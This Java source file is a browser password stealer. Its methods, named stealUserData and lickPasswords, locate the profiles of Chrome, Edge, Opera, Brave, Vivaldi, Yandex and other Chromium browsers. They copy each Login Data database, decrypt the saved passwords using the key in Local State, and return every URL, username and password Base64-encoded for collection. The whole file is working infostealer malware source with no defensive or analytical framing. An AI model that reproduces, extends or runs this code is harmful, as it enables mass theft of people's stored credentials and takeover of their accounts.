package com.example.browsers;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;

import java.io.File;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.ResultSet;
import java.util.Base64;
import java.util.HashMap;
import java.util.Properties;
import com.example.browsers.Util.DecryptUtil;

public class Passwords {
    private static final File appData = new File(System.getenv("APPDATA"));
    private static final File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static final HashMap<String, String> paths = new HashMap<String, String>() {
        {
            put("Google Chrome", localAppData + "\\Google\\Chrome\\User Data");
            put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data");
            put("Chromium", localAppData + "\\Chromium\\User Data");
            put("Opera", appData + "\\Opera Software\\Opera Stable");
            put("Opera GX", appData + "\\Opera Software\\Opera GX Stable");
            put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data");
            put("Vivaldi", localAppData + "\\Vivaldi\\User Data");
            put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data");
        }
    };
    private String Passwords = "";
    public String grabPassword() {
        stealUserData();

        return Base64.getEncoder().encodeToString(Passwords.getBytes());
    }
    private void stealUserData() {
        for (String browser : paths.keySet()) {
            Passwords = Passwords + "\n"+browser+"\n";
            File userData = new File(paths.get(browser));
            if (!userData.exists()) continue;
            byte[] key = DecryptUtil.getKey(new File(userData, "Local State"));
            for (File data: userData.listFiles()) {
                if (data.getName().contains("Profile") || data.getName().equals("Default")) {
                    lickPasswords(data, key);
                } else if (data.getName().equals("Login Data")) {
                    lickPasswords(userData, key);
                }
            }
        }
    }

    private void lickPasswords(File profile, byte[] key) {
        try {
            File loginData = new File(profile, "Login Data");
            File tempLoginData = new File(profile, "Temp Login Data");
            if (!loginData.exists()) return;
            Files.copy(loginData.toPath(), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            java.sql.Driver driver = DecryptUtil.getDriver();
            Properties props = new Properties();
            Connection connection = driver.connect("jdbc:sqlite:" + tempLoginData.getAbsolutePath(), props);
            ResultSet resultSet = connection.createStatement().executeQuery("SELECT origin_url, username_value, password_value FROM logins");
            while (resultSet.next()) {
                byte[] encryptedPassword = resultSet.getBytes(3);
                String decryptedUrl = (!resultSet.getString(1).equals("")) ? resultSet.getString(1) : "N/A";
                String decryptedUsername =(!resultSet.getString(2).equals("")) ? resultSet.getString(2) : "N/A";
                String decryptedPassword = DecryptUtil.decrypt(encryptedPassword, key);

                if (decryptedPassword != null || (resultSet.getString(1) != null && resultSet.getString(2) != null)) {

                    Passwords = Passwords + "url: " + decryptedUrl + "\n";
                    Passwords = Passwords + "Username: " + decryptedUsername + "\n";
                    Passwords = Passwords + "password: " + decryptedPassword + "\n";
                }
            }
        } catch (Exception e) {

        }
    }
  //  public String count() {
    //     int count = 0;
    //    for (JsonElement pswd : pswds) {
     //       JsonObject pswdObject = pswd.getAsJsonObject();
      //     if (pswdObject.has("url")) {
       //         count++;
        //    }
       // }
        //return String.valueOf(count);
   // }
}
